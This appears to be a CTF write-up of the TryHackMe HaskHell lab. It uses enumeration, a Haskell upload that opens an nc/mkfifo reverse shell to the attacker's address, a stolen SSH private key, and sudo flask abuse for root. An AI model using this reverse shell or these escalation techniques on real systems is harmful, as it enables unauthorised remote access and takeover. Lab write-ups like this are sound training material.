---
title: TryHackMe - HaskHell
description: My writeup on HaskHell box.
categories:
 - tryhackme
tags: tryhackme Haskhell ssh flask
---

![](https://i.imgur.com/kx7mZbu.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **HaskHell**  |
| Difficulty :  | **Medium**             |   
| Play :    | [HaskHell](https://tryhackme.com/room/haskhell){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

This was a really awesome box, that i learnt some new things. We have to upload a haskhell reverse shell, then we have 2 privescs one is about SSH private key & then last one for root is about FLASK. Let's start!

## Enumeration/Reconnaissance

Now as always let’s continue with a nmap scan. (Note: Takes some time)

```
$ ip=10.10.156.95                           
$ nmap -p- -sC -sV -oN nmap/haskhell.thm $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 13:33 EET
Nmap scan report for 10.10.156.95 (10.10.156.95)
Host is up (0.17s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
```

Once we visit the port 5001, we can see an article about functional programming & Haskell. Without wasting more time let's fire up `gobuster`.

```
$ gobuster dir -q -u http://$ip:5001/ -w $medium -x php,txt,html -o scans/gobuster.txt
/submit (Status: 200)
```

`/submit` is an upload form, homework page says that `Only Haskell files are accepted for uploads.` Haskhell is a purely functional programming language with file extension `.hs`

I've never heard of this language so i googled how can i execute system commands using HaskHell & i found this:

```haskHell
module Main where

import System.Process

main = callCommand "whoami"
```

I guess when we upload our file it gets compile `ghc -o shell shell.hs` & execute it in background `./shell.hs` & then shows us the result.

## Shell as flask

So let's simply execute a reverse shell. Save it as `shell.hs` & upload it.

```haskHell
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc tun0_ip_address 5555 >/tmp/f"
```

```
$ nc -lvp 5555
listening on [any] 5555 ...

$ python -c 'import pty; pty.spawn("/bin/bash")'
flask@haskhell:~$ whoami;id
flask
uid=1001(flask) gid=1001(flask) groups=1001(flask)
```

We can read now the `user.txt`

```
flask@haskhell:~$ find / -name "user.txt" 2>/dev/null
/home/prof/user.txt
flask@haskhell:~$ cat /home/prof/user.txt
flag{TRY_DO_IT_ALONE}
```

## Shell as prof

Under `/home/prof` i noticed that we can access the `.ssh` folder and use his SSH private key. So we have an easy privesc.

```
flask@haskhell:/home/prof/.ssh$ ls -la
total 20
drwxr-xr-x 2 prof prof 4096 May 27  2020 .
drwxr-xr-x 7 prof prof 4096 May 27  2020 ..
-rw-rw-r-- 1 prof prof  395 May 27  2020 authorized_keys
-rw-r--r-- 1 prof prof 1679 May 27  2020 id_rsa
-rw-r--r-- 1 prof prof  395 May 27  2020 id_rsa.pub
flask@haskhell:/home/prof/.ssh$ ssh -i id_rsa prof@localhost

$ bash -i
prof@haskhell:~$ whoami;id
prof
uid=1002(prof) gid=1002(prof) groups=1002(prof)
```

## Shell as root

While doing the manual enumeration for privesc, `sudo -l` says that we can run `flask` as root!

```
prof@haskhell:~$ sudo -l
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
```

Flask is a web framework, it’s a Python module that allow us to develop web applications easily. Using the `flask run` command we can execute our web application but isn't that simple we have first to tell flask how to import it using the `FLASK_APP` environment variable!

So let's make a file under `/tmp` to execute `/bin/bash` using the `os.system` function.

```
prof@haskhell:/tmp$ printf "import os\nos.system('/bin/bash')" > root.py
prof@haskhell:/tmp$ export FLASK_APP=root.py
prof@haskhell:/tmp$ sudo flask run
root@haskhell:/tmp# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

Let's read the final flag:

```
root@haskhell:/root# cat root.txt
flag{TRY_DO_IT_ALONE}
```

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"}

Until next time keep pwning hard! :fire:
